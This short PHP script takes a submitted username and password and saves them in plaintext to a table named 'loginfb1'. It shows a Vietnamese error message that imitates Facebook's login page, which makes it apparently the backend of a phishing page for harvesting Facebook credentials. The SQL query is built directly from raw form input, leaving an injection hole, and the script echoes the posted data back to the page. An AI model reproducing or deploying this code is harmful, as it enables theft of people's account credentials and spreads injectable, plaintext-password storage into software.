<?php 

require 'db/connect.php';
if (isset($_POST['btn-login'])){
    echo "<pre>";
    print_r($_POST);
    $username = $_POST['username'];
    $password = $_POST['password'];
    if (!empty($username) && !empty($password)){
        //inset Du Lieu
        echo "<pre>";
        print_r($_POST);

        $sql = "INSERT INTO `loginfb1` (`username`, `password`) VALUES('$username', '$password') ";

        if ($conn->query($sql)===TRUE){
            echo "lưu Dữ Liệu Thành Công ";
        }
        else {
            echo "Lỗi {$sql}".$conn->error ;
        }
    }
    else {
    echo "Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. Đăng ký tài khoản.";
    }
}

?>